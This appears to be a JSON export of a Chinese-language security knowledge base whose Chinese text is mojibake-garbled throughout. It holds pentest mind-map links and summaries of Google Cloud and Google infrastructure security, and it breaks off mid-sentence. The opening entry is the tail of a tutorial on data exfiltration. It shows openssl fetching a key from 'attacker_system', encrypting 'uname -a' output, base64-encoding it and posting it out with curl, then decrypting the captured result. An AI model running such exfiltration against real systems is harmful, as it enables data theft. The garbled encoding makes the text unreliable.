è¿™æ¬¡ä½¿ç”¨`ncat`æ˜¯ä¸ºäº†ä½¿ç”¨å…¶å†…ç½®çš„ SSL è§£å¯†åŠŸèƒ½è¿›è¡Œè§£å¯†ï¼Œç›¸å…³å‚æ•°è§£é‡Šå¦‚ä¸‹ï¼š\r\n  - ä»æ”»å‡»ç³»ç»Ÿä¸­æå–å…¬é’¥å¹¶ä¿å­˜åˆ°æ–‡ä»¶ä¸­openssl s_client -connect attacker_system:443 | openssl x509 -pubkey -noout > /tmp/f\r\n  - æ‰§è¡Œæ‰€éœ€çš„å‘½ä»¤å¹¶ä½¿ç”¨ OpenSSL å’Œä¹‹å‰æå–çš„å…¬é’¥è¿›è¡ŒåŠ å¯†ï¼Œç„¶åå¯¹æ•°æ®è¿›è¡Œ base64 ç¼–ç uname -a | openssl rsautl -inkey /tmp/f -pubin -encrypt | base64 -w0;\r\n  - åˆ é™¤åŒ…å«å…¬é’¥çš„æ–‡ä»¶rm /tmp/f\r\n  - curlé€šè¿‡ HTTPS å°†å‘½ä»¤ä¸­çš„ base64 è¾“å‡ºå‘å¸ƒåˆ°æ”»å‡»ç³»ç»Ÿã€‚\r\n\r\n- æˆ‘ä»¬ç°åœ¨å¯ä»¥åƒè¿™æ ·è§£ç å’Œè§£å¯†ç»“æœï¼š\r\n  ```\r\n    base64 -d <<< SxYwWIC7ceUtsPGo3ETSPaCTMW9AdXWuyAR01AIBu0LLlHWDVa5uSP3J86vyyePaoybuoAEgvit5HQDNfL8fS1lSix/enb9UVCAn7hp/dZ9RGrtzqIRWFgHm0O4M69S1bHT1bn/3F0EiCZ53blulegKnxaCmSM64aO6c12dpJWD7A8QcJwG4R5J/owE9LbR5rJkmvTCf3bAD9FkvX5vD8GJmJkLhjaYa+mB6VZ67FcJdzUykfGJPsWOg5ju8nCTasxgjPR7Wsv7EXRoV7uia9u1yjfIpb5DloR2lqhfihvs4vuCmm23pJNZyIikSL0FyOGgQSps21mP0ri3UfRIryw== \\\r\n        | openssl rsautl -inkey priv.key -decrypt\r\n        \r\n    Linux 25b01d656003 5.10.47-linuxkit #1 SMP Sat Jul 3 21:51:47 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux\r\n  ```\r\n\r\n# å‚è€ƒèµ„æ–™\r\n  - [https://medium.com/maverislabs/bash-tricks-for-command-execution-and-data-extraction-over-http-s-ca76e9c80933](https://medium.com/maverislabs/bash-tricks-for-command-execution-and-data-extraction-over-http-s-ca76e9c80933)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/ä¸“é¢˜ç ”ç©¶/æ€ç»´å¯¼å›¾/ADæ¸—é€æµ‹è¯•æ€ç»´å¯¼å›¾/","title":"ADæ¸—é€æµ‹è¯•æ€ç»´å¯¼å›¾"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: ADæ¸—é€æµ‹è¯•æ€ç»´å¯¼å›¾\r\ntags:\r\n- ä¸“é¢˜ç ”ç©¶\r\n- æ€ç»´å¯¼å›¾\r\n---\r\n\r\n![1I5KBU](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/1I5KBU.jpg)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/ä¸“é¢˜ç ”ç©¶/æ€ç»´å¯¼å›¾/Exchangeæ¸—é€æµ‹è¯•æ€ç»´å¯¼å›¾/","title":"Exchangeæ¸—é€æµ‹è¯•æ€ç»´å¯¼å›¾"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Exchangeæ¸—é€æµ‹è¯•æ€ç»´å¯¼å›¾\r\ntags:\r\n- ä¸“é¢˜ç ”ç©¶\r\n- æ€ç»´å¯¼å›¾\r\n---\r\n\r\n![4RKTgk](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/4RKTgk.jpg)\r\n\r\n[https://github.com/Orange-Cyberdefense/arsenal/tree/master/mindmap](https://github.com/Orange-Cyberdefense/arsenal/tree/master/mindmap)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/ä¸“é¢˜ç ”ç©¶/æ€ç»´å¯¼å›¾/äº‘å®‰å…¨æ¸—é€æµ‹è¯•æ€ç»´å¯¼å›¾/","title":"äº‘å®‰å…¨æ¸—é€æµ‹è¯•æ€ç»´å¯¼å›¾"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: äº‘å®‰å…¨æ¸—é€æµ‹è¯•æ€ç»´å¯¼å›¾\r\ntags:\r\n- ä¸“é¢˜ç ”ç©¶\r\n- æ€ç»´å¯¼å›¾\r\n---\r\n\r\n![cuFKlM](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/cuFKlM.jpg)\r\n[https://github.com/TROUBLE-1/Cloud-Pentesting/tree/main/Note%20%26%20Mind%20Map/Cloud%20Pentesting](https://github.com/TROUBLE-1/Cloud-Pentesting/tree/main/Note%20%26%20Mind%20Map/Cloud%20Pentesting)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/ä¸“é¢˜ç ”ç©¶/æ€ç»´å¯¼å›¾/å†…å­˜å–è¯æ€ç»´å¯¼å›¾/","title":"å†…å­˜å–è¯æ€ç»´å¯¼å›¾"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: å†…å­˜å–è¯æ€ç»´å¯¼å›¾\r\ntags:\r\n- ä¸“é¢˜ç ”ç©¶\r\n- æ€ç»´å¯¼å›¾\r\n---\r\n\r\n![rRYD3v](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/rRYD3v.jpg)\r\n\r\n[https://github.com/AndrewRathbun/DFIRMindMaps/tree/main/MemoryForensics/SANSMemoryForensicsCheatSheet](https://github.com/AndrewRathbun/DFIRMindMaps/tree/main/MemoryForensics/SANSMemoryForensicsCheatSheet)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/ä¸“é¢˜ç ”ç©¶/æ€ç»´å¯¼å›¾/ç½‘ç»œå®‰å…¨æ€ç»´å¯¼å›¾/","title":"ç½‘ç»œå®‰å…¨æ€ç»´å¯¼å›¾"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: ç½‘ç»œå®‰å…¨æ€ç»´å¯¼å›¾\r\ntags:\r\n- ä¸“é¢˜ç ”ç©¶\r\n- æ€ç»´å¯¼å›¾\r\n---\r\n\r\n![rRYD3v](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/Network%20Security.png)\r\n\r\n[https://www.xmind.net/m/PBS9](https://www.xmind.net/m/PBS9)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/è¡Œä¸šè§‚å¯Ÿ/Google/Google Cloud å®‰å…¨æ¶æ„/","title":"Google Cloud å®‰å…¨æ¶æ„"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Google Cloud å®‰å…¨æ¶æ„\r\ntags:\r\n- è¡Œä¸šè§‚å¯Ÿ\r\n- Google\r\n- å®‰å…¨æ¶æ„\r\n---\r\n\r\n# 1. å®‰å…¨åˆè§„è¦æ±‚\r\n\r\næ»¡è¶³å…¨çƒä¸åŒå›½å®¶åœ°åŒºçš„æ³•å¾‹ã€è§„ç« åˆ¶åº¦ã€æ ‡å‡†ã€‚\r\n\r\n![DJFWXD](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/DJFWXD.jpg)\r\n\r\n# 2. å®‰å…¨æ¶æ„æ¨¡å‹\r\n\r\nåŸºæœ¬ä¸Šå°±æ˜¯å‚è€ƒäº†NIST CSFå’ŒCIS Controlï¼Œä¸­è§„ä¸­çŸ©ã€‚\r\n\r\n![kNboy6](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/kNboy6.jpg)\r\n\r\n![itBqm3](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/itBqm3.jpg)\r\n\r\n# 3. Google Cloud åœ¨å®‰å…¨ä¸Šåšäº†ä»€ä¹ˆï¼Ÿ\r\n\r\nå½“ç»„ç»‡å¼€å§‹åœ¨äº‘ä¸­æ„å»º IT åŸºç¡€æ¶æ„æ—¶ï¼Œä¼šè€ƒè™‘ä»¥ä¸‹å‡ ä¸ªåŸºæœ¬å®‰å…¨ç»„ä»¶æ¥å»ºç«‹ç¯å¢ƒã€‚\r\n\r\n![SGvGUN](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/SGvGUN.jpg)\r\n\r\n![yTjHqc](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/yTjHqc.jpg)\r\n\r\n\r\n\r\nå…·ä½“å¦‚ä¸‹ï¼š\r\n\r\nâ€‹\t1. **å®‰å…¨æ²»ç† Governance**ï¼šå®šä¹‰äº†å®‰å…¨æ¶æ„è·¯çº¿å›¾ï¼Œä»¥åŠå¦‚ä½•ç®¡ç†å’Œéµå¾ªå„ç§æ ‡å‡†å’Œè¿‡ç¨‹ä»¥ç¡®ä¿ç¯å¢ƒå®‰å…¨ç¨³å®šï¼›æœ€å¥½æ˜¯éµå¾ªæˆ–å‚è€ƒNISTç­‰ä¸šç•Œæ ‡å‡†åŒ–æ¡†æ¶ï¼›åŒæ—¶ä¹ŸåŒ…å«äº†é£é™©ç®¡ç†ï¼ˆå®šä¹‰æˆæœ¬ã€äº†è§£é£é™©ã€åŠªåŠ›å‡è½»è¿™äº›é£é™©ï¼‰å’Œå®‰å…¨äººå‘˜åŸ¹è®­ã€‚\r\n\r\nâ€‹\t2. **DevSecOps**ï¼šèå…¥DevOpsæµç¨‹ï¼Œç†è§£è¦éƒ¨ç½²çš„åº”ç”¨/Workloadï¼Œåœ¨æ¼æ´äº§ç”Ÿå‰å°±æ¶ˆç­ä»–ä»¬ã€‚\r\n\r\nâ€‹\t3. **IAM**ï¼šå¼ºå¤§çš„ IAM å·¥å…·å’Œæµç¨‹å°†æ˜¯æ‚¨æ„å»ºç»è¿‡èº«ä»½éªŒè¯å’Œæˆæƒçš„ç¯å¢ƒçš„ç¬¬ä¸€é“é˜²çº¿ã€‚\r\n\r\nâ€‹\t4. **ç½‘ç»œå®‰å…¨**ï¼šåœ¨å°†æ•°æ®ä¸­å¿ƒä¼ ç»Ÿè¿ç§»åˆ°äº‘ç«¯çš„è¿‡ç¨‹ä¸­ï¼Œåº”ç”¨ç¨‹åºå’Œå·¥å…·é€šå¸¸å¯èƒ½å¯¹å¤–æš´éœ²è®¿é—®ï¼Œéœ€è¦ä½¿ç”¨åŒ…æ‹¬éš”ç¦»ã€VPCæ§åˆ¶ã€äº‘é˜²ç«å¢™ã€DDoSé˜²æŠ¤ç­‰æ¥è¿›è¡Œé˜²æŠ¤ã€‚\r\n\r\nâ€‹\t5. **è®¡ç®—å’ŒåŸºç¡€è®¾æ–½å®‰å…¨**ï¼šæä¾›åŒ…æ‹¬äº‘åŸç”Ÿç›‘æ§å’Œæ—¥å¿—æœåŠ¡ç­‰å¤šä¸ªæ–¹é¢èƒ½åŠ›ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒçš„å„ç§åº•å±‚ç»„ä»¶ï¼ˆå¦‚ Monitoringã€Traceã€Loggingã€Error Reporting å’Œ Debugï¼‰æä¾›äº†æ•´ä¸ª GCP åŸºç¡€æ¶æ„çš„å®æ—¶å¯è§æ€§ã€‚\r\n\r\nâ€‹\t6. **åº”ç”¨ç¨‹åºå®‰å…¨**ï¼šéœ€è¦ç´§æ€¥é¢„é˜²æˆ–ç¼“è§£ OWASP Top 10 ç­‰å¨èƒï¼Œä½¿ç”¨åŒ…æ‹¬æ‰«æå™¨ã€WAFç­‰æ‰‹æ®µã€‚\r\n\r\nâ€‹\t7. **æ•°æ®å®‰å…¨**ï¼šé˜²æ­¢æ•°æ®æ³„éœ²æ˜¯æ•´ä¸ªå®‰å…¨åŸºç¡€è®¾æ–½å’Œæµç¨‹çš„åŸºçŸ³ã€‚å¤§å¤šæ•°åœ¨äº‘ä¸­æ„å»ºçš„æ•°æ®åº“ç°åœ¨éƒ½å¸¦æœ‰æœ¬æœºå®‰å…¨æ§åˆ¶ï¼Œå…·æœ‰æˆæƒè§†å›¾å’Œåˆ—çº§å®‰å…¨ç­‰åŠŸèƒ½ï¼Œåº”ç”¨ç¨‹åºå¯ä»¥é…ç½®ä¸ºåˆ©ç”¨è¿™äº›æ§åˆ¶è¿›è¡Œæˆæƒè®¿é—®ã€‚\r\n\r\nâ€‹\t8. **ç”¨æˆ·ç»ˆç«¯å’Œè¿æ¥å®‰å…¨æ€§**ï¼šåˆ©ç”¨å…¶åºå¤§çš„å†…éƒ¨ç½‘ç»œå°†å…¬å¸ç½‘ç»œä¿æŒåœ¨å†…éƒ¨ç½‘ç»œä¸­ï¼Œé¿å…ä¸å¿…è¦çš„æš´éœ²ã€‚\r\n\r\n# 4. æ•°æ®å’Œäº‹ä»¶é©±åŠ¨æ¶æ„\r\n\r\nä¿æŠ¤è¿è¡Œç¯å¢ƒçš„æ¨èæ¶æ„ä¹‹ä¸€æ˜¯å¯†åˆ‡å…³æ³¨æ•°æ®å’Œäº‹ä»¶ï¼Œå¹¶åŠªåŠ›è¡¥æ•‘æˆ–æé†’é€‚å½“çš„å›¢é˜Ÿã€‚\r\n\r\n![QLEWAH](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/QLEWAH.jpg)\r\n\r\n# 5. å®‰å…¨ç»„ä»¶æ¦‚è§ˆ\r\n\r\n![10n9t3](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/10n9t3.jpg)\r\n\r\n# 6. å‚è€ƒ\r\n\r\n- [https://info-on-security.medium.com/gcp-security-architecture-whitepaper-da19fc9b4ba2](https://info-on-security.medium.com/gcp-security-architecture-whitepaper-da19fc9b4ba2)\r\n- [https://www.youtube.com/watch?v=LZyhEEC7jcg&t=2316s](https://www.youtube.com/watch?v=LZyhEEC7jcg&t=2316s)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/è¡Œä¸šè§‚å¯Ÿ/Google/Google åŸºç¡€è®¾æ–½å®‰å…¨è®¾è®¡/","title":"Google åŸºç¡€è®¾æ–½å®‰å…¨è®¾è®¡"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Google åŸºç¡€è®¾æ–½å®‰å…¨è®¾è®¡\r\ntags:\r\n- è¡Œä¸šè§‚å¯Ÿ\r\n- Google\r\n- ç³»ç»Ÿè®¾è®¡\r\n---\r\n\r\n# ç®€ä»‹\r\n\r\næœ¬æ–‡æ¡£æ¦‚è¦ä»‹ç»äº† Google çš„æŠ€æœ¯åŸºç¡€æ¶æ„å¦‚ä½•ä»è®¾è®¡å±‚é¢å®ç°åŸç”Ÿå®‰å…¨æ€§ï¼Œè¿™äº›å†…å®¹é¢å‘å®‰å…¨é«˜ç®¡ã€å®‰å…¨æ¶æ„å¸ˆå’Œå®¡æ ¸äººå‘˜ã€‚\r\n\r\næœ¬æ–‡æ¡£ä»‹ç»äº†ä»¥ä¸‹å†…å®¹ï¼š\r\n\r\n- Google çš„å…¨çƒæŠ€æœ¯åŸºç¡€æ¶æ„ï¼Œæ—¨åœ¨ä»¤ Google èƒ½å¤Ÿåœ¨æ•´ä¸ªä¿¡æ¯å¤„ç†å‘¨æœŸä¸­æä¾›å®‰å…¨ä¿éšœã€‚æ­¤åŸºç¡€æ¶æ„å¯å¸®åŠ©å®ç°ä»¥ä¸‹ç›®çš„ï¼š\r\n  - å®‰å…¨åœ°éƒ¨ç½²æœåŠ¡\r\n  - é€šè¿‡æœ€ç»ˆç”¨æˆ·çš„éšç§ä¿æŠ¤æªæ–½å®‰å…¨åœ°å­˜å‚¨æ•°æ®\r\n  - ä¿éšœæœåŠ¡ä¹‹é—´çš„é€šä¿¡å®‰å…¨\r\n  - é€šè¿‡äº’è”ç½‘å®‰å…¨ä¸”ç§å¯†åœ°ä¸å®¢æˆ·äº¤æµ\r\n  - Google å·¥ç¨‹å¸ˆè¿›è¡Œå®‰å…¨è¿è¥\r\n- æˆ‘ä»¬å¦‚ä½•ä½¿ç”¨æ­¤åŸºç¡€æ¶æ„æ„å»ºäº’è”ç½‘æœåŠ¡ï¼ŒåŒ…æ‹¬ Google æœç´¢ã€Gmail å’Œ Google ç›¸å†Œç­‰ä¸ªäººç”¨æˆ·æœåŠ¡ä»¥åŠ Google Workspace å’Œ Google Cloud ç­‰ä¼ä¸šæœåŠ¡ã€‚\r\n- æˆ‘ä»¬åœ¨ç¡®ä¿åŸºç¡€æ¶æ„å’Œè¿è¥å®‰å…¨æ–¹é¢çš„æŠ•èµ„ã€‚Google æœ‰è®¸å¤šè‡´åŠ›äºå®‰å…¨ä¸éšç§ä¿æŠ¤çš„å·¥ç¨‹å¸ˆï¼Œå…¶ä¸­è®¸å¤šäººæ˜¯å…¬è®¤çš„ä¸šç•Œæƒå¨ã€‚\r\n- Google çš„å®‰å…¨äº§å“å’ŒæœåŠ¡ï¼Œè¿™äº›äº§å“å’ŒæœåŠ¡æ˜¯ä¸ºæ»¡è¶³æˆ‘ä»¬è‡ªèº«çš„å®‰å…¨éœ€æ±‚åœ¨å†…éƒ¨è¿›è¡Œåˆ›æ–°è€Œäº§ç”Ÿçš„æˆæœã€‚ä¾‹å¦‚ï¼Œ[BeyondCorp](https://cloud.google.com/beyondcorp?hl=zh-cn) æ˜¯æˆ‘ä»¬åœ¨å†…éƒ¨å®ç°[é›¶ä¿¡ä»»å®‰å…¨æ¨¡å‹](https://cloud.google.com/blog/products/identity-security/cloud-ciso-perspectives-january-2022?hl=zh-cn)çš„ç›´æ¥æˆæœã€‚\r\n- å¦‚ä½•é€å±‚è®¾è®¡åŸºç¡€æ¶æ„çš„å®‰å…¨æœºåˆ¶ã€‚è¿™äº›å®‰å…¨å±‚åŒ…æ‹¬ï¼š\r\n  - [åº•å±‚åŸºç¡€æ¶æ„](https://cloud.google.com/docs/security/infrastructure/design?hl=zh-cn#secure-low-level)\r\n  - [æœåŠ¡éƒ¨ç½²](https://cloud.google.com/docs/security/infrastructure/design?hl=zh-cn#secure-service)\r\n  - [æ•°æ®å­˜å‚¨](https://cloud.google.com/docs/security/infrastructure/design?hl=zh-cn#secure-data)\r\n  - [äº’è”ç½‘é€šä¿¡](https://cloud.google.com/docs/security/infrastructure/design?hl=zh-cn#secure-internet)\r\n  - [è¿ç»´](https://cloud.google.com/docs/security/infrastructure/design?hl=zh-cn#operational-security)\r\n\r\næœ¬æ–‡æ¡£çš„åç»­éƒ¨åˆ†å°†ä»‹ç»è¿™äº›å®‰å…¨å±‚ã€‚\r\n\r\n# å®‰å…¨çš„åº•å±‚åŸºç¡€æ¶æ„\r\n\r\næœ¬éƒ¨åˆ†ä»‹ç»å¦‚ä½•ä¿æŠ¤æ•°æ®ä¸­å¿ƒçš„å®ä½“åœºæ‰€ã€æ•°æ®ä¸­å¿ƒçš„ç¡¬ä»¶ä»¥åŠç¡¬ä»¶ä¸Šè¿è¡Œçš„è½¯ä»¶æ ˆã€‚\r\n\r\n## å®ä½“åœºæ‰€çš„å®‰å…¨æ€§\r\n\r\næˆ‘ä»¬è®¾è®¡å’Œå»ºé€ äº†è‡ªå·±çš„æ•°æ®ä¸­å¿ƒï¼Œå…¶ä¸­åŠ å…¥äº†å¤šå±‚ç‰©ç†å®‰å…¨ä¿æŠ¤æªæ–½ã€‚å¯¹è¿™äº›æ•°æ®ä¸­å¿ƒçš„è®¿é—®å—åˆ°ä¸¥æ ¼æ§åˆ¶ã€‚æˆ‘ä»¬ä½¿ç”¨å¤šä¸ªç‰©ç†å®‰å…¨å±‚æ¥ä¿æŠ¤æ•°æ®ä¸­å¿ƒåœºåœ°ï¼ŒåŒ…æ‹¬ç”Ÿç‰©è¯†åˆ«ã€é‡‘å±æ£€æµ‹ã€æ‘„åƒå¤´ã€è½¦è¾†æ éšœå’Œæ¿€å…‰å…¥ä¾µæ£€æµ‹ç³»ç»Ÿã€‚å¦‚éœ€äº†è§£è¯¦æƒ…ï¼Œè¯·å‚é˜…[æ•°æ®ä¸­å¿ƒå®‰å…¨æ€§](https://www.google.com/about/datacenters/data-security/?hl=zh-cn)ã€‚\r\n\r\næˆ‘ä»¬è¿˜åœ¨ç¬¬ä¸‰æ–¹æ•°æ®ä¸­å¿ƒæ‰˜ç®¡äº†ä¸€äº›æœåŠ¡å™¨ã€‚åœ¨è¿™äº›æ•°æ®ä¸­å¿ƒé‡Œï¼Œé™¤äº†æ•°æ®ä¸­å¿ƒè¿è¥å•†æä¾›çš„å®‰å…¨å±‚ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜ç¡®ä¿è½å®ç”± Google ç®¡æ§çš„ç‰©ç†å®‰å…¨æªæ–½ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬è¿è¡Œç‹¬ç«‹äºæ•°æ®ä¸­å¿ƒè¿è¥å•†å®‰å…¨å±‚çš„ç”Ÿç‰©è¯†åˆ«ç³»ç»Ÿã€æ‘„åƒå¤´å’Œé‡‘å±æ¢æµ‹å™¨ã€‚\r\n\r\n## ç¡¬ä»¶çš„è®¾è®¡å’Œæ¥æº\r\n\r\nGoogle çš„æ¯ä¸ªæ•°æ®ä¸­å¿ƒéƒ½æœ‰æ•°åƒå°æœåŠ¡å™¨ä¸æœ¬åœ°ç½‘ç»œç›¸è¿ã€‚æˆ‘ä»¬è®¾è®¡æœåŠ¡å™¨ä¸»æ¿å’Œç½‘ç»œè®¾å¤‡ï¼Œå¯¹åˆä½œçš„ç»„ä»¶ä¾›åº”å•†è¿›è¡Œå®¡æ ¸ï¼Œå¹¶è°¨æ…é€‰æ‹©ç»„ä»¶ã€‚æˆ‘ä»¬ä¸ä¾›åº”å•†åˆä½œï¼Œå¯¹ç»„ä»¶æä¾›çš„å®‰å…¨å±æ€§è¿›è¡Œå®¡æ ¸å’ŒéªŒè¯ã€‚æˆ‘ä»¬è¿˜è®¾è®¡ä¸“é—¨çš„èŠ¯ç‰‡ï¼ŒåŒ…æ‹¬æˆ‘ä»¬åœ¨æœåŠ¡å™¨ã€è®¾å¤‡å’Œå¤–å›´è®¾å¤‡ä¸Šéƒ¨ç½²çš„ç¡¬ä»¶å®‰å…¨èŠ¯ç‰‡ï¼ˆç§°ä¸º [Titan](https://cloud.google.com/blog/products/identity-security/titan-in-depth-security-in-plaintext?hl=zh-cn)ï¼‰ã€‚è¿™äº›èŠ¯ç‰‡å¯ä½¿æˆ‘ä»¬åœ¨ç¡¬ä»¶çº§åˆ«å¯¹æ­£è§„çš„ Google è®¾å¤‡è¿›è¡Œè¯†åˆ«å’Œèº«ä»½éªŒè¯ï¼Œå¹¶å……å½“ç¡¬ä»¶ä¿¡ä»»æ ¹ã€‚\r\n\r\n**æ³¨æ„**ï¼šTitan ç¡¬ä»¶èŠ¯ç‰‡çš„å˜ä½“ä¹Ÿç”¨äº [Pixel è®¾å¤‡](https://safety.google/pixel/?hl=zh-cn#security-by-design)å’Œ [Titan å®‰å…¨å¯†é’¥](https://cloud.google.com/titan-security-key?hl=zh-cn)ã€‚\r\n\r\n## å®‰å…¨å¯åŠ¨æ ˆå’Œæœºå™¨èº«ä»½æ ‡è¯†\r\n\r\nGoogle æœåŠ¡å™¨åˆ©ç”¨å„ç§æŠ€æœ¯æ¥ç¡®ä¿å¯åŠ¨æ­£ç¡®çš„è½¯ä»¶æ ˆã€‚æˆ‘ä»¬å¯¹åŸºæ¿ç®¡ç†æ§åˆ¶å™¨ (BMC)ã€BIOSã€å¼•å¯¼åŠ è½½ç¨‹åºã€å†…æ ¸å’ŒåŸºç¡€æ“ä½œç³»ç»Ÿæ˜ åƒç­‰åº•å±‚ç»„ä»¶ä½¿ç”¨åŠ å¯†ç­¾åã€‚å¯ä»¥åœ¨æ¯æ¬¡å¯åŠ¨æˆ–æ›´æ–°æœŸé—´å¯¹è¿™äº›ç­¾åè¿›è¡ŒéªŒè¯ã€‚Google æœåŠ¡å™¨çš„ç¬¬ä¸€ä¸ªå®Œæ•´æ€§æ£€æŸ¥ä½¿ç”¨ç¡¬ä»¶ä¿¡ä»»æ ¹ã€‚è¿™äº›ç»„ä»¶ç”± Google æ§åˆ¶å’Œæ„å»ºï¼Œå¹¶é€šè¿‡å®Œæ•´æ€§è¯æ˜è¿›è¡Œå¼ºåŒ–ã€‚å¯¹äºæ¯ä¸€ä»£æ–°ç¡¬ä»¶ï¼Œæˆ‘ä»¬éƒ½è‡´åŠ›äºä¸æ–­æé«˜å®‰å…¨æ€§ã€‚ä¾‹å¦‚ï¼Œæ ¹æ®æœåŠ¡å™¨è®¾è®¡çš„ä»£æ¬¡ï¼Œå¯åŠ¨é“¾çš„ä¿¡ä»»æ ¹åœ¨ä»¥ä¸‹æŸä¸ªç»„ä»¶ä¸­ï¼š\r\n\r\n- Titan ç¡¬ä»¶èŠ¯ç‰‡\r\n- å¯é”å®šçš„å›ºä»¶èŠ¯ç‰‡\r\n- è¿è¡Œæˆ‘ä»¬è‡ªå·±çš„å®‰å…¨ä»£ç çš„å¾®æ§åˆ¶å™¨\r\n\r\næ•°æ®ä¸­å¿ƒçš„æ¯ä¸ªæœåŠ¡å™¨éƒ½æœ‰å”¯ä¸€çš„èº«ä»½æ ‡è¯†ã€‚å¯ä»¥å°†è¿™ä¸€èº«ä»½æ ‡è¯†ä¸ç¡¬ä»¶ä¿¡ä»»æ ¹ä»¥åŠæœºå™¨å¯åŠ¨æ‰€ç”¨çš„è½¯ä»¶ç›¸å…³è”ã€‚æ­¤èº«ä»½æ ‡è¯†ç”¨äºå¯¹æœºå™¨ä¸Šçš„åº•å±‚ç®¡ç†æœåŠ¡ä¹‹é—´çš„ API è°ƒç”¨è¿›è¡Œèº«ä»½éªŒè¯ã€‚æ­¤èº«ä»½æ ‡è¯†ä¹Ÿç”¨äºåŒå‘æœåŠ¡å™¨èº«ä»½éªŒè¯å’Œä¼ è¾“åŠ å¯†ã€‚æˆ‘ä»¬å¼€å‘äº†[åº”ç”¨å±‚ä¼ è¾“å®‰å…¨ (ALTS)](https://cloud.google.com/docs/security/encryption-in-transit/application-layer-transport-security?hl=zh-cn) ç³»ç»Ÿï¼Œç”¨äºä¿æŠ¤åŸºç¡€æ¶æ„ä¸­çš„è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ (RPC) é€šä¿¡çš„å®‰å…¨ã€‚å¦‚æœå‘ç”Ÿå®‰å…¨çªå‘äº‹ä»¶ï¼Œå¯ä»¥é›†ä¸­æ’¤æ¶ˆè¿™äº›æœºå™¨èº«ä»½æ ‡è¯†ã€‚æ­¤å¤–ï¼Œå®ƒä»¬çš„è¯ä¹¦å’Œå¯†é’¥ä¼šå®šæœŸè½®æ›¿ï¼Œæ—§çš„è¯ä¹¦å’Œå¯†é’¥ä¼šè¢«æ’¤æ¶ˆã€‚\r\n\r\næˆ‘ä»¬å¼€å‘äº†è‡ªåŠ¨åŒ–ç³»ç»Ÿæ¥æ‰§è¡Œä»¥ä¸‹ä»»åŠ¡ï¼š\r\n\r\n- ç¡®ä¿æœåŠ¡å™¨è¿è¡Œå…¶è½¯ä»¶æ ˆçš„æœ€æ–°ç‰ˆæœ¬ï¼ˆåŒ…æ‹¬å®‰å…¨è¡¥ä¸ï¼‰ã€‚\r\n- æ£€æµ‹å’Œè¯Šæ–­ç¡¬ä»¶å’Œè½¯ä»¶é—®é¢˜ã€‚\r\n- ä½¿ç”¨å¯åŠ¨æ—¶éªŒè¯å’Œéšå¼è¯æ˜ç¡®ä¿æœºå™¨å’Œå¤–å›´è®¾å¤‡çš„å®Œæ•´æ€§ã€‚\r\n- ç¡®ä¿åªæœ‰è¿è¡ŒæŒ‡å®šè½¯ä»¶å’Œå›ºä»¶çš„æœºå™¨æ‰èƒ½è®¿é—®ä½¿å…¶å¯åœ¨ç”Ÿäº§ç½‘ç»œä¸­è¿›è¡Œé€šä¿¡çš„å‡­æ®ã€‚\r\n- å½“ä¸å†éœ€è¦æœºå™¨æ—¶ï¼Œåœ¨æœåŠ¡ä¸­ç§»é™¤æˆ–é‡æ–°åˆ†é…æœºå™¨ã€‚\r\n\r\n# å®‰å…¨çš„æœåŠ¡éƒ¨ç½²\r\n\r\nGoogle æœåŠ¡æ˜¯ç”±æˆ‘ä»¬çš„å¼€å‘è€…ç¼–å†™å¹¶åœ¨æˆ‘ä»¬çš„åŸºç¡€æ¶æ„ä¸Šè¿è¡Œçš„åº”ç”¨äºŒè¿›åˆ¶æ–‡ä»¶ã€‚Google æœåŠ¡çš„ç¤ºä¾‹åŒ…æ‹¬ Gmail æœåŠ¡å™¨ã€Spanner æ•°æ®åº“ã€Cloud Storage æœåŠ¡å™¨ã€YouTube è§†é¢‘è½¬ç å™¨å’Œè¿è¡Œå®¢æˆ·åº”ç”¨çš„ Compute Engine è™šæ‹Ÿæœºã€‚ä¸ºäº†å¤„ç†æ‰€éœ€è§„æ¨¡çš„å·¥ä½œè´Ÿè½½ï¼Œå¯èƒ½ä¼šæœ‰æ•°åƒå°æœºå™¨è¿è¡ŒåŒä¸€æœåŠ¡çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚é›†ç¾¤ç¼–æ’æœåŠ¡ï¼ˆç§°ä¸º 